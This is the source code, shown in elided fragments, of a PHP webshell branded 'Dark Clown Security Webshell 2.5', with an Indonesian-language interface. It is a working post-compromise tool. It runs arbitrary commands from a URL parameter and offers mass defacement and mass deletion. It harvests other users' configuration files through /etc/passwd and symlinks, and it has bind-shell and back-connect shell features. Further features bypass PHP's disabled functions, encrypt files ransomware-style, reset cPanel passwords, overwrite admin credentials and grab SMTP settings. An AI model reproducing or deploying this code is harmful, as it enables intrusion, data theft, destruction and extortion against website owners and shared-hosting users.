...
<html>
	<head>
		...
		<meta name="copyright" content="Dark Clown Security | Webshell"/>
		<title>Dark Clown Security Webshell</title>
		<link rel="icon" type="image/png" href="https://j.top4top.io/p_16468z7pa1.png"/>
	...
	<body class="text-center text-light">
       ...
       border:none !important;
		...
		<div class="container text-center mt-3">
            <img height="250" width="300" src="https://j.top4top.io/p_16468z7pa1.png">
			<h1>Dark Clown Security</h1>
			<h5>Webshell Version 2.5</h5><hr/>
			<form method="post">
                <h2><i class="fab fa-keycdn"></i></h2>
				<div class="form-group input-group">
					<input type="password" name="pass" placeholder="Password" class="form-control transparent-input">
				</div>
				<input type="submit" class="btn btn-danger btn-block bg-transparent" class="form-control" value="Login">
			</form>
		</div>
		<a href="https://www.facebook.com/darkclownsec1" class="text-muted fixed-bottom mb-3">Copyright 2021 || Dark Clown Security</a>
	</body>
</html>
<?php
exit;
...
$imgfol = "<img src='https://image.flaticon.com/icons/png/128/891/891135.png' class='ico'></img>";
...
function aksiUpload($dir){
	echo '</div><form method="POST" enctype="multipart/form-data" name="uploader" id="uploader">
		<div class="card bg-transparent">
			<div class="card-body form-group">
				<p class="text-muted">Upload File Lebih Dari 1 bisa</p>
				<div class="custom-file">
					<input type="file" name="file[]" multiple class="custom-file-input" id="customFile">
					<label class="custom-file-label bg-transparent ungu" for="customFile">Upload File</label>
				</div>
				<input type="submit" class="btn btn-sm btn-primary btn-block mt-4 p-2 bg-transparent ungu" name="upload" value="Upload">
			</div>
		</div>
	</form><div>';
...
function chmodFile($dir,$file,$nfile){
	echo "</div><form method='POST'>
		...
		<div class='form-group input-group'>
			<input type='text' name='perm' class='form-control bg-transparent ungu' value='".substr(sprintf('%o', fileperms($_GET['file'])), -4)."'>
			<input type='submit' class='btn bg-transparent ungu form-control' value='Chmod'>
		</div>
	</form><div>";
	if(isset($_POST['perm'])){
...
function buatFile($dir,$imgfile){
	echo "</div><h4>$imgfile Create File :</h4>
	<form method='POST'>
		<div class='input-group'>
			<input type='text' class='form-control bg-transparent ungu' name='nama_file[]' placeholder='Nama File...'>
			<div class='input-group-prepend'>
				<div class='input-group-text bg-transparent ungu'><a id='add_input'><i class='fa fa-plus'></i></a></div>
			</div>
		</div><br/>
		<div id='output'></div>
		<textarea name='isi_file' class='form-control bg-transparent ungu' rows='13' placeholder='Isi File...'></textarea><br/>
		<input type='submit' class='btn btn-info btn-block bg-transparent ungu' name='bikin' value='Buat'>
	</form><div>";
	if (isset($_POST['bikin'])){
		...
		if ($buat){
			$swa = "success";
			$text = "Berhasil MemCreate File";
			swall($swa,$text,$dir);
		}else{
			$swa = "error";
			$text = "Gagal MemCreate File";
			swall($swa,$text,$dir);
		}
	}
}
function view($dir,$file,$nfile,$imgfile){
	echo '</div>[ <a class="active" href="?dir='.$dir.'&aksi=view&file='.$file.'"><i class="fa fa-eye"> Lihat</i></a> ]  [ <a href="?dir='.$dir.'&aksi=edit&file='.$file.'"><i class="fa fa-edit"> Edit</i></a> ]  [ <a href="?dir='.$dir.'&aksi=rename&file='.$file.'"><i class="fa fa-pencil"> Rename</i></a> ]  [ <a href="?dir='.$dir.'&aksi=hapusf&file='.$file.'"><i class="fa fa-trash"> Delete</i></a> ]
	<h5>'.$imgfile.' Lihat File : '.$nfile.'</h5>
	<textarea rows="13" class="form-control bg-transparent ungu" disabled="">'.htmlspecialchars(@file_get_contents($file)).'</textarea><br/><div>';
}
function editFile($dir,$file,$nfile,$imgfile){
	echo '</div>[ <a href="?dir='.$dir.'&aksi=view&file='.$file.'"><i class="fa fa-eye"> Lihat</i></a> ]  [ <a class="active" href="?dir='.$dir.'&aksi=edit&file='.$file.'"><i class="fa fa-edit"> Edit</i></a> ]  [ <a href="?dir='.$dir.'&aksi=rename&file='.$file.'"><i class="fa fa-pencil"> Rename</i></a> ]  [ <a href="?dir='.$dir.'&aksi=hapusf&file='.$file.'"><i class="fa fa-trash"> Delete</i></a> ]';
	echo "<form method='POST'>
		<h5>$imgfile Edit File : $nfile</h5>
		<textarea rows='13' class='form-control bg-transparent ungu' name='isi'>".htmlspecialchars(@file_get_contents($file))."</textarea><br/>
			<button type='sumbit' class='btn bg-transparent ungu btn-block' name='edit_file'>Update</button>
	</form><div>";
...
function renameFile($dir,$file,$nfile,$imgfile){
	echo '</div>[ <a href="?dir='.$dir.'&aksi=view&file='.$file.'"><i class="fa fa-eye"> Lihat</i></a> ]  [ <a href="?dir='.$dir.'&aksi=edit&file='.$file.'"><i class="fa fa-edit"> Edit</i></a> ]  [ <a class="active" href="?dir='.$dir.'&aksi=rename&file='.$file.'"><i class="fa fa-pencil"> Rename</i></a> ]  [ <a href="?dir='.$dir.'&aksi=hapusf&file='.$file.'"><i class="fa fa-trash"> Delete</i></a> ]';
	echo "<form method='POST'>
		<h5>$imgfile Rename File : $nfile</h5>
		<input type='text' class='form-control bg-transparent ungu' name='namanew' placeholder='Masukan Nama Baru...' value='$nfile'><br/>
		<button type='sumbit' class='btn bg-transparent ungu btn-block' name='rename_file'>Rename</button>
	</form><div>";
...
function hapusFile($dir,$file,$nfile){
	echo '</div>[ <a href="?dir='.$dir.'&aksi=view&file='.$file.'"><i class="fa fa-eye"> Lihat</i></a> ]  [ <a href="?dir='.$dir.'&aksi=edit&file='.$file.'"><i class="fa fa-edit"> Edit</i></a> ]  [ <a href="?dir='.$dir.'&aksi=rename&file='.$file.'"><i class="fas fa-pen"> Rename</i></a> ]  [ <a class="active" href="?dir='.$dir.'&aksi=hapusf&file='.$file.'"><i class="fa fa-trash"> Delete</i></a> ]';
	echo "<div class='card card-body text-center text-dark mb-4 bg-transparent'>
		<p style='color: white;'>Yakin Menghapus : <font color='lime'>$nfile</font></p>
		<form method='POST'>
			<a class='btn btn-danger btn-block bg-transparent ungu' href='?dir=$dir'>Tidak</a>
			<input type='submit' name='ya' class='btn btn-success btn-success btn-block bg-transparent ungu' value='Ya'>
		</form>
	</div><div>";
	if ($_POST['ya']){
		if (unlink($file)){
...
function chmodFolder($dir,$ndir){
	echo "</div><form method='POST'>
		...
		<div class='form-group input-group'>
			<input type='text' name='perm' class='form-control bg-transparent ungu' value='".substr(sprintf('%o', fileperms($_GET['dir'])), -4)."'>
			<input type='submit' class='btn bg-transparent ungu form-control ' value='Chmod' name='chmo'>
		</div>
	</form><div>";
	if(isset($_POST['chmo'])){
...
function buatFolder($dir,$imgfol){
	echo "</div><h5>$imgfol Create Folder :</h5>
	<form method='POST'>
		<div class='input-group'>
			<input type='text' class='form-control bg-transparent ungu' name='nama_folder[]' placeholder='Nama Folder...'>
			<div class='input-group-prepend'>
				<div class='input-group-text bg-transparent ungu'><a id='add_input1'><i class='fa fa-plus'></i></a></div>
			</div>
		</div><br/>
		<div id='output1'></div>
		<input type='submit' class='btn btn-info btn-block bg-transparent ungu' name='buat' value='Buat'>
	</form><div>";
	if (isset($_POST['buat'])){
		...
		if ($fd){
			$swa = "success";
			$text = "Berhasil MemCreate Folder";
			swall($swa,$text,$dir);
		}else{
			$swa = "error";
			$text = "Gagal MemCreate Folder";
			swall($swa,$text,$dir);
		}
	}
}
function renameFolder($dir,$ndir,$imgfol){
	echo "</div>[ <a href='?dir=".$dir."&aksi=rename_folder' class='active'><i class='fa fa-pencil'> Rename</i></a> ]  [ <a href='?dir=".$dir."&aksi=hapus_folder'><i class='fa fa-trash'> Delete</i></a> ] 
	<h5>$imgfol Rename Folder : <font color='lime'>$ndir</font></h5>
	<form method='POST'>
		<input type='text' class='form-control bg-transparent ungu' name='namanew' placeholder='Masukan Nama Baru...' value='$nama'><br/>
		<button type='sumbit' class='btn bg-transparent ungu btn-block' name='ganti'>Ganti!!</button><br/>
	</form><div>";
...
function deleteFolder($dir,$ndir){
	echo "</div>[ <a href='?dir=".$dir."&aksi=rename_folder'><i class='fa fa-pencil'> Rename</i></a> ]  [ <a href='?dir=".$dir."&aksi=hapus_folder' class='active'><i class='fa fa-trash'> Delete</i></a> ] 
	<div class='card card-body text-center text-dark mb-4 bg-transparent ungu'>
		<p style='color: white;'>Apakah Yakin Menghapus : <font color='lime'>$ndir</font> ?</p>
		<form method='POST'>
			<a class='btn bg-transparent ungu btn-block' href='?dir=".dirname($dir)."'>Tidak</a>
			<input type='submit' name='ya' class='btn bg-transparent ungu btn-block' value='Ya'>
		</form>
	</div><br/>";
	if ($_POST['ya']){
		if(is_dir($dir)){
...
function aksiMasdef($dir,$file,$imgfol,$imgfile){
	...
	if($_POST['start']){
		echo "</div>[ <a href='?dir=$dir'>Kembali</a> ]
		<textarea class='form-control bg-transparent ungu' rows='13' disabled=''>";
			if($_POST['tipe'] == 'mahal'){
		...
		echo "</div><form method='post'>
			<div class='text-center'>
				<h5>Tipe :</h5>
				<input id='toggle-on' class='toggle toggle-left bg-transparent ungu' name='tipe' value='murah' type='radio' checked>
				<label for='toggle-on' class='butn'>Biasa</label>
				<input id='toggle-off' class='toggle toggle-right bg-transparent ungu' name='tipe' value='mahal' type='radio'>
				<label for='toggle-off' class='butn'>Masal</label>
			</div> 
			<h5>$imgfol Lokasi :</h5>
			<input type='text' name='d_dir' value='$dir' class='form-control bg-transparent ungu'><br>
			<h5>$imgfile Nama File :</h5>
			<input type='text' name='d_file' placeholder='[Ex] index.php' class='form-control bg-transparent ungu'><br/>
			<h5>$imgfile Isi File :</h5>
			<textarea name='script' class='form-control bg-transparent ungu' rows='13' placeholder='[Ex] Hacked By Dark Clown Security'></textarea><br/>
			<input type='submit' name='start' value='Mass Deface' class='btn bg-transparent ungu btn-block'>
		</form><div>";
	}
	exit;
}
function aksiMasdel($dir,$file,$imgfol,$imgfile){
	...
	if($_POST['start']){
		...
		echo "</div><form method='post'>
			...
			<h5>$imgfile Nama File :</h5>
			<input type='text' name='d_file' placeholder='[Ex] index.php' class='form-control bg-transparent ungu'><br/>
			<input type='submit' name='start' value='Delete!!' class='btn btn-danger form-control bg-transparent ungu'>
	</form><div>";
	}
	exit;
}
	...
	if(preg_match("/hsphere/", $dir)){
		...
		if(isset($_POST['jump'])){
			...
			echo '<center><form method="post">
				List Domains: <br>
				<textarea name="url" class="form-control bg-transparent ungu">';
				$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
				while($getss = fgets($fp)){
					echo $getss;
				}
				echo  '</textarea><br>
					  <input type="submit" value="Jumping" name="jump" class="btn bg-transparent ungu btn-block">
			</form></center>';
		}
...
function aksiConfig($dir,$file){
	if($_POST){
		$passwd = $_POST['passwd'];
		mkdir("darkclownsec_config", 0777);
		$isi_htc = "Options allnRequire NonenSatisfy Any";
		$htc = fopen("darkclownsec_config/.htaccess","w");
		fwrite($htc, $isi_htc);
			...
			if(is_readable($user_config_dir)){
				...
				foreach($grab_config as $config => $nama_config){
					...
					if($ambil_config == ''){
						...
						$file_config = fopen("darkclownsec_config/$user_con-$nama_config.txt","w");
		...
		<a href='?dir=$dir/darkclownsec_config' class='btn btn-success btn-block mb-4'>Click Here</a>";
	}else{
		echo "</div><form method='post'>
			<p class='text-danger'>/etc/passwd error ?  <a href='?dir=$dir&aksi=passwbypass'>Bypass</a></p>
			<textarea name='passwd' class='form-control bg-transparent ungu' rows='13'>".file_get_contents('/etc/passwd')."</textarea><br/>
			<input type='submit' class='btn bg-transparent ungu btn-block' value='Get Config!!'>
		</form><div>";
	}
	exit;
}
function aksiBypasswd($dir,$file){
	echo '</div><div claas="container">
		<form method="POST">
			<p class="text-center">Bypass etc/passwd With :</p>
			<div class="d-flex justify-content-center flex-wrap">
				<input type="submit" class="fiture btn bg-transparent ungu btn-sm" value="System Function" name="syst">
				<input type="submit" class="fiture btn bg-transparent ungu btn-sm" value="Passthru Function" name="passth">
				<input type="submit" class="fiture btn bg-transparent ungu btn-sm" value="Exec Function" name="ex">
				<input type="submit" class="fiture btn bg-transparent ungu btn-sm" value="Shell_exec Function" name="shex">
				<input type="submit" class="fiture btn bg-transparent ungu btn-sm" value="Posix_getpwuid Function" name="melex">
			</div><hr/>
			<p class="text-center">Bypass User With :</p>
			<div class="d-flex justify-content-center flex-wrap">
				<input type="submit" class="fiture btn bg-transparent ungu btn-sm" value="Awk Program" name="awkuser">
				<input type="submit" class="fiture btn bg-transparent ungu btn-sm" value="System Function" name="systuser">
				<input type="submit" class="fiture btn bg-transparent ungu btn-sm" value="Passthru Function" name="passthuser">	
				<input type="submit" class="fiture btn bg-transparent ungu btn-sm" value="Exec Function" name="exuser">		
				<input type="submit" class="fiture btn bg-transparent ungu btn-sm" value="Shell_exec Function" name="shexuser">
			</div>
		</form><div>';
		$mail = 'ls /var/mail';
		$paswd = '/etc/passwd';
		if($_POST['syst']){
			echo"<textarea class='form-control bg-transparent ungu' rows='13'>";
...
function aksiAdminer($dir,$file){
	...
	if(file_exists('adminer.php')){
		echo "<a href='$full/adminer.php' target='_blank' class='text-center btn bg-transparent ungu btn-block mb-3'>Login Adminer</a>";
	}else{
		if(adminer("https://raw.githubusercontent.com/pematon/adminer-custom/master/adminer.php","adminer.php")){
			echo "<p class='text-center'>Berhasil Membuat Adminer</p><a href='$full/adminer.php' target='_blank' class='text-center btn bg-transparent ungu btn-block mb-3'>Login Adminer</a>";
		}else{
			echo "<p class='text-center text-danger'>Gagal Membuat Adminer</p><div>";
		}
	}
	exit;
}
function aksiSym($dir,$file){
	...
	##htaccess
	if($d0mains){
		@mkdir("darkclownsec_sym",0777);
		@chdir("darkclownsec_sym");
		@exe("ln -s / root");
				...
				if(eregi("zone",$d0main)){
					...
					if(strlen(trim($domains[1][0])) > 2){
						...
						echo "<tr>
							...
							<td>".$user['name']."</td>
							<td><a href='$full/darkclownsec_sym/root/home/".$user['name']."/public_html' target='_blank'>Symlink</a></td>
						</tr>";
						flush();
						$dcount++;
					}
			...
			<table class='text-center table-responsive'>
				...
				while(!feof($file)){
					...
					echo "<tr>
						<td>".$dcount."</td>
						<td>".$matches."</td>
						<td><a href=$full/darkclownsec_sym/root/home/".$matches."/public_html target='_blank'>Symlink</a></td>
					</tr>";
					$dcount++;
				}
				fclose($file);
...
function aksiSymread($dir,$file){
	echo "</div>read /etc/named.conf
	<form method='post' action='?dir=$dir&aksi=symread&save=1'>
	<textarea class='form-control bg-transparent ungu' rows='13' name='file'>";
		flush();
		flush();
		$file = '/etc/named.conf';
		$r3ad = @fopen($file, 'r');
		if ($r3ad){
			...
			if ($sm){
				$r3ad = @fopen('darkclownsec_sym/sym.txt', 'r');
				$content = @fread($r3ad, @filesize($file));
				echo "".htmlentities($content)."";
			}
		}
	echo "</textarea><br/><input type='submit' class='btn bg-transparent ungu form-control' value='Save'/> </form><div>";
	if(isset($_GET['save'])){
...
function sym404($dir,$file){
	$cp = get_current_user();
	if($_POST['execute']){
		@rmdir("darkclownsec_sym404");
		@mkdir("darkclownsec_sym404", 0777);
		$dir = $_POST['dir'];
		$isi = $_POST['isi'];
		@system("ln -s ".$dir."darkclownsec_sym404/".$isi);
		@symlink($dir,"darkclownsec_sym404/".$isi);
		$inija = fopen("darkclownsec_sym404/.htaccess", "w");
		@fwrite($inija,"ReadmeName ".$isi."\nOptions Indexes FollowSymLinks\nDirectoryIndex ids.html\nAddType text/plain php html php5 phtml\nAddHandler text/plain php html php5 phtml\nSatisfy Any");
		echo'<a href="/darkclownsec_sym404/" target="_blank" class="btn btn-success btn-block mb-3">Click Me!!</a>';
	}else{
		echo '</div><h2>Symlink 404</h2>
		<form method="post">
			File Target: <input type="text" class="form-control bg-transparent ungu" name="dir" value="/home/'.$cp.'/public_html/wp-config.php"><br/>
			Save As: <input type="text" class="form-control bg-transparent ungu" name="isi" placeholder="[Ex] file.txt"/><br/>
			<input type="submit" class="btn bg-transparent ungu btn-block" value="Execute" name="execute"/>
...
function symBypass($dir,$file){
	...
	echo "</div>read /etc/passwd <font color='red'>error ?  </font><a href='?dir=".$dir."&aksi=passwbypass'>Bypass Here</a>
	<form method='post' action='?dir=$dir&aksi=sym_bypas&save=1'>
		...
		flush();
		echo "</textarea><br/>
		<input type='submit' class='btn bg-transparent ungu btn-block' value='Symlink'/>
	</form><div>";
	flush();
	exit;
}
function bcTool($dir,$file){
	echo "</div><h4 class='text-center mb-4'>Back Connect Tools</h4>
	<form method='post'>
				<span>Bind port to /bin/sh [Perl]</span><br/>
				<label>Port :</label>
				<div class='form-group input-group mb-4'>
					<input type='text' name='port' class='form-control bg-transparent ungu' value='6969'>
					<input type='submit' name='bpl' class='btn btn-danger form-control bg-transparent ungu' value='Reserve'>
				</div>
				<h5>Back-Connect</h5>
				<label>Server :</label>
				<input type='text' name='server' class='form-control mb-3 bg-transparent ungu' placeholder='". $_SERVER['REMOTE_ADDR'] ."'>
				<label>Port :</label>
				<div class='form-group input-group mb-4'>
					<input type='text' name='port' class='form-control bg-transparent ungu' placeholder='443'>
					<select class='form-control bg-transparent ungu' name='backconnect'>
				...
				<input type='submit' class='btn bg-transparent ungu btn-block' value='Connect'>
	</form><div>";
	if($_POST['bpl']){
...
function disabFunc($dir,$file){
	echo "</div><div class='card card-body text-center bg-transparent ungu'>
		<h4 class='text-center mt-2 mb-3'>Bypass Disable Functions</h2>
		<form method='POST'>
			<input type='submit' class='btn bg-transparent ungu' name='ini' value='php.ini'/>
			<input type='submit' class='btn bg-transparent ungu' name='htce' value='.htaccess'/>
			<input type='submit' class='btn bg-transparent ungu' name='litini' value='Litespeed'/>
		</form><div>";
		if(isset($_POST['ini'])){
			$file = fopen("php.ini","w");
			echo fwrite($file,"safe_mode = OFF\ndisable_functions = NONE");
			fclose($file);
			echo "<a href='php.ini' class='btn bg-transparent ungu btn-block' target='_blank'>Klik Coeg!</a>";
...
function resetCp($dir){
	echo '</div><h5 class="text-center mb-4"><i class="fa fa-key"></i> Auto Reset Password Cpanel</h5>
	<form method="POST">
		<div class="form-group input-group">
			<div class="input-group-prepend">
				<div class="input-group-text "><i class="fa fa-envelope"></i></div>
				</div>
				<input type="email" name="email" class="form-control bg-transparent ungu" placeholder="Masukan Email..."/>
			</div>
			<input type="submit" name="submit" class="btn bg-transparent ungu btn-block" value="Send"/>
		</div>
	</form><div>';
...
function autoEdit($dir,$file){
	if($_POST['hajar']){
		...
		echo "</div><h3 class='text-center mb-4'>Auto Edit User</h3>
		<form method='post'>
			<h5>Lokasi Dir Config</h5>
			<input type='text' class='form-control mb-3 bg-transparent ungu' name='config_dir' value='$dir'>
			<h5>Set User & Pass :</h5>
			<input type='text' name='user_baru' value='darkclownsec' class='form-control mb-3 bg-transparent ungu' placeholder='Set Username'>
			<input type='text' name='pass_baru' value='darkclownsec' class='form-control mb-4 bg-transparent ungu' placeholder='Set Password'>
			<input type='submit' name='hajar' value='Edit User' class='btn bg-transparent ungu btn-block'>
		</form>
		<p class='text-muted mb-4'>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</p><div>";
	}
	exit;
}
function ransom($dir,$file){
	if(isset($_POST["encrypt"])) {
		$dir = $_POST["path"];
		echo"<textarea class='form-control mb-4 bg-transparent ungu' rows='13' disabled=''>";
		...
		echo '</div><form method="post">
			<div class="form-group">
				...
				<div class="form-group input-group">
					<div class="input-group-prepend">
						<div class="input-group-text bg-transparent ungu"><i class="fa fa-home"></i></div>
					</div>
					<input type="text" name="path" class="form-control bg-transparent ungu" value="'.$dir.'"/>
				</div>
				<input type="submit" name="encrypt" class="btn bg-transparent ungu btn-block" value="Encrypt"/>
			</div>
		</form><div>';
	}
	exit;
...
function scj($dir){
	...
	foreach($dirs as $dirb){
		...
		if(preg_match("/JConfig|joomla/", $ambil)){
			...
			echo "<table class='text-white table table-bordered bg-transparent ungu'>
				<tr>
...
function bypasscf(){
	echo '</div><form method="POST">
		...
		<div class="form-group input-group">
			<select class="form-control bg-transparent ungu" name="idsPilih">
		...
		<div class="form-group input-group mb-4">
			<input class="form-control bg-transparent ungu" type="text" name="target" placeholder="Masukan Url">
			<input class="btn bg-transparent ungu form-control" type="submit" value="Bypass">
		</div>
	</form><div>';
	$target = $_POST['target'];
...
function zipMenu($dir,$file){
	...
	echo '</div><div class="card card-body bg-transparent ungu mb-4">
		<h4 class="text-center">Zip Menu</h3>
		<form enctype="multipart/form-data" method="post">
			<div class="form-group">
				<label>Zip File:</label>
				<div class="custom-file">
					<input type="file" name="zip_file" class="custom-file-input bg-transparent ungu" id="customFile">
					<label class="custom-file-label bg-transparent ungu" for="customFile">Choose file</label>
				</div>
				<input type="submit" name="upnun" class="btn bg-transparent ungu btn-block mt-3" value="Upload & Unzip"/>
			</div>
		</form>';
		if($_POST["upnun"]){
		...
		<form method='post'>
			<label>Folder</label>
			<input type='text' name='folder' class='form-control mb-3 bg-transparent ungu' value='$dir'>
			<input type='submit' name='backup' class='btn bg-transparent ungu btn-block' value='Backup!'>
		</form>";
		if($_POST['backup']){
			$fol = $_POST['folder'];
		...
		<form action='' method='post'>
			...
			<input type='text' name='file_zip' class='form-control mb-3 bg-transparent ungu' value='$dir/$exzip'>
			<input type='submit' name='extrak' class='btn bg-transparent ungu btn-block' value='Unzip!'>
		</form>";
		if($_POST['extrak']){
			$zip = $_POST["file_zip"];
...
<link href="https://fonts.googleapis.com/css2?family=Rock+Salt&display=swap" rel="stylesheet">
	...
	<body class="text-light">
        ...
        <h1 class="font2">Dark Clown Security</h1>
        <h5 class="font2">Webshell Version 2.5</a></h5><br>
        <a href="https://www.facebook.com/darkclownsec1/" class="lain"><i class="fa fa-facebook tambah"></i></a>
        <a href="https://www.instagram.com/darkclownsecurity.id/" class="lain"><i class="fa fa-instagram tambah"></i></a>
        <a href="https://www.youtube.com/channel/UCTp6yYYTifItFu5x-BzZzCg" class="lain"><i class="fa fa-youtube-play tambah"></i></a>
        <a href="https://github.com/Dark-Clown-Security" class="lain"><i class="fa fa-github tambah"></i></a>
        <a href="https://darkclownsecurity.org" class="lain"><i class="fa fa-globe tambah"></i></a>
        </center>
		<script>
			...
			$(document).on('click', '#add_input', function(e){
				if(x < max_fields){
					x++;
					$('#output').append('<div class=\"input-group\ form-group\ text-dark\" id=\"out\"><input type=\"text\" class=\"form-control bg-transparent ungu\" name=\"nama_file[]\" placeholder=\"Nama File...\"><div class=\"input-group-prepend\ remove\"><div class=\"input-group-text bg-transparent ungu\"><a href="#"><i class=\"fa fa-minus\"></i></a></div></div></div>');
				}
			...
			$(document).on('click', '#add_input1', function(e){
				if(x < max_fields){
					x++;
					$('#output1').append('<div class=\"input-group\ form-group\ text-dark\" id=\"out\"><input type=\"text\" class=\"form-control bg-transparent ungu\" name=\"nama_folder[]\" placeholder=\"Nama Folder...\"><div class=\"input-group-prepend\ remove\"><div class=\"input-group-text bg-transparent ungu\"><a href="#"><i class=\"fa fa-minus\"></i></a></div></div></div>');
				}
...
.breadcrumb-arrow li.active span:after {
    ...
    border-left: 10px solid #007bff;
			...
			.lain{color:#6F00FF;font-size:20px;margin-left:5px;top:1px;}
			.lain:hover{color:red;}
			.tambah{
				width:35px;
				height:35px;
				line-height:35px;
        ...
        <form>
            <input type="text" class="form-control bg-transparent ungu" name="cmd" autocomplete="off" placeholder="linux : ls / uname -a / id / wget shellurl || windows : dir / ipconfig / ftype">
        </form>
        <div class="text-center">
            <div class="d-flex justify-content-center flex-wrap">
                <a href="?home" class="fiture btn ungu btn-sm bg-transparent"><i class="fa fa-home"></i> Home</a>
                <a href="?dir='.$dir.'&aksi=upload" class="fiture btn ungu btn-sm bg-transparent"><i class="fa fa-upload"></i> Upload</a>
                <a href="?dir='.$dir.'&aksi=buat_file" class="fiture btn ungu btn-sm bg-transparent"><i class="fa fa-plus-circle"></i> Create File</a>
                <a href="?dir='.$dir.'&aksi=buat_folder" class="fiture btn ungu btn-sm bg-transparent"><i class="fa fa-plus"></i> Create Folder</a>
                <a href="?dir='.$dir.'&aksi=masdef" class="fiture btn ungu btn-sm bg-transparent"><i class="fa fa-exclamation-triangle"></i> Mass Deface</a>
                <a href="?dir='.$dir.'&aksi=masdel" class="fiture btn ungu btn-sm bg-transparent"><i class="fa fa-trash"></i> Mass Delete</a>
                <a href="?dir='.$dir.'&aksi=jumping" class="fiture btn ungu btn-sm bg-transparent"><i class="fa fa-exclamation-triangle"></i> Jumping</a>
                <a href="?dir='.$dir.'&aksi=config" class="fiture btn ungu btn-sm bg-transparent"><i class="fa fa-cogs"></i> Config</a>
                <a href="?dir='.$dir.'&aksi=adminer" class="fiture btn ungu btn-sm bg-transparent"><i class="fa fa-user"></i> Adminer</a>
                <a href="?dir='.$dir.'&aksi=symlink" class="fiture btn ungu btn-sm bg-transparent"><i class="fa fa-exclamation-circle"></i> Symlink</a>
                <a href="?dir='.$dir.'&aksi=bctools" class="fiture btn ungu btn-sm bg-transparent"><i class="fas fa-network-wired"></i> Network</a>
                <a href="?dir='.$dir.'&aksi=resetpasscp" class="fiture btn ungu btn-sm bg-transparent"><i class="fa fa-key"></i> Auto Reset Cpanel</a>
                <a href="?dir='.$dir.'&aksi=auteduser" class="fiture btn ungu btn-sm bg-transparent"><i class="fas fa-user-edit"></i> Auto Edit User</a>
                <a href="?dir='.$dir.'&aksi=ransom" class="fiture btn ungu btn-sm bg-transparent"><i class="fab fa-keycdn"></i> Ransomware</a>
                <a href="?dir='.$dir.'&aksi=smtpgrab" class="fiture btn ungu btn-sm bg-transparent"><i class="fas fa fa-exclamation-circle"></i> SMTP Grabber</a>
                <a href="?dir='.$dir.'&aksi=bypascf" class="fiture btn ungu btn-sm bg-transparent"><i class="fas fa-cloud"></i> Bypass Cloud Flare</a>
                <a href="?dir='.$dir.'&aksi=zip_menu" class="fiture btn ungu btn-sm bg-transparent"><i class="fa fa-file-archive-o"></i> Zip Menu</a>
                <a href="logout" class="fiture btn ungu btn-sm bg-transparent"><i class="fa fa-sign-out"></i> logout</a>
                <!-- Button trigger modal -->
                <button type="button" class="fiture btn ungu btn-sm bg-transparent" data-bs-toggle="modal" data-bs-target="#exampleModal">
                <i class="fa fa-search"></i> Informasi
                </button>
                  ...
                  <div class="modal-dialog">
                    <div class="modal-content bg-dark">
                      <div class="modal-header">
                        <h5 style="color:lime;" class="modal-title" id="exampleModalLabel">Information Server</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                      </div>
                      <div class="modal-body">
                                    <h5 style="color:lime;"><i class="fa fa-search" ></i> Informasi : </h5>
                                    <div class="card table-responsive style="width: 18rem;">
                                        <div class="card-body bg-dark">
                                            <table class="table infor">
                                                <tr>
                                                    <td style="color:lime;">PHP</td>
                                                    <td style="color:lime;"> : '.$ver.'</td>
                                                </tr>
                                                <tr>
                                                    <td style="color:lime;">IP Server</td>
                                                    <td style="color:lime;"> : '.$ip.'</td>
                                                </tr>
                                                <tr>
                                                    <td style="color:lime;">HDD</td>
                                                    <td class="d-flex" style="color:lime;">Total : '.formatSize($total).' Free : '.formatSize($free).' ['.$pers.'%]</td>
                                                </tr>
                                                <tr>
                                                    <td style="color:lime;">Domain</td>
                                                    <td style="color:lime;">: '.$dom.'</td>
                                                </tr>
                                                <tr>
                                                    <td style="color:lime;">MySQL</td>
                                                    <td style="color:lime;">: '.$mysql.'</td>
                                                </tr>
                                                <tr>
                                                    <td style="color:lime;">cURL</td>
                                                    <td style="color:lime;">: '.$curl.'</td>
                                                </tr>
                                                <tr>
                                                    <td style="color:lime;">Mailer</td>
                                                    <td style="color:lime;">: '.$mail.'</td>
                                                </tr>
                                                <tr>
                                                    <td style="color:lime;">Disable Function</td>
                                                    <td style="color:lime;">: '.$show_ds.'</td>
                                                </tr>
                                                <tr>
                                                    <td style="color:lime;">Software</td>
                                                    <td style="color:lime;">: '.$sof.'</td>
                                                </tr>
                                                <tr>
                                                    <td style="color:lime;">Sistem Operasi</td>
                                                    <td style="color:lime;"> : '.$os.'</td>
                                                </tr>
                                            </table>
                                        </div>
                                    </div>
                      <div class="modal-footer">
                        <button type="button" class="fiture btn ungu btn-sm bg-transparent" data-bs-dismiss="modal">Close</button>
                        <button type="button" class="fiture btn ungu btn-sm bg-transparent">Save changes</button>
                      </div>
                    </div>
                  </div>
                </div>
			...
			<div class="col-md-7 mt-4">';
				...
				//cmd
				if(isset($_GET['cmd'])){
					echo "</div><pre><code>".exe($_GET['cmd'])."</code></pre>";
					exit;
				}
				//about
				if (isset($_GET['about'])){
				...
				*/
				...
				$path = str_replace('\\','/',$path);
				$paths = explode('/',$path);
				echo "</div><i class='fa fa-fw fa-home'></i> :";
				...
				echo '</div><div id="tab" class="table table-responsive"><table width="100%" class="table-sm text-nowrap table-borderless table-hover container-fluid text-white" border="0" cellpadding="3" cellspacing="1" align="center">
...
';
							...
							<td><a title="Rename" class="btn2 ungu bg-transparent" href="?dir='.$path.'/'.$dir.'&aksi=rename_folder">&nbsp;<i class="fas fa-pen"></i>&nbsp;</a>&nbsp;&nbsp;<a title="Delete" class="btn2 ungu bg-transparent" href="?dir='.$path.'/'.$dir.'&aksi=hapus_folder">&nbsp;<i class="fa fa-trash"></i>&nbsp;</a>
							</td>
						</tr>';
					}
					...
					foreach($scandir as $file){
						...
						echo '<tr class="text-center">
							...
							if($ext == "php"){
								echo 'https://image.flaticon.com/icons/png/128/2305/2305919.png"';
							}elseif ($ext == "html"){
								echo 'https://image.flaticon.com/icons/png/128/3143/3143482.png"';
							}elseif ($ext == "css"){
								echo 'https://image.flaticon.com/icons/png/128/3143/3143471.png"';
							}elseif ($ext == "png"){
								echo 'https://image.flaticon.com/icons/png/128/3143/3143449.png"';
							}elseif ($ext == "jpg"){
								echo 'https://image.flaticon.com/icons/png/128/3143/3143441.png"';
							}elseif ($ext == "jpeg"){
								echo 'https://image.flaticon.com/icons/png/128/1088/1088542.png"';
							}elseif($ext == "zip"){
								echo 'https://image.flaticon.com/icons/png/128/3143/3143366.png"';
							}elseif ($ext == "js"){
								...
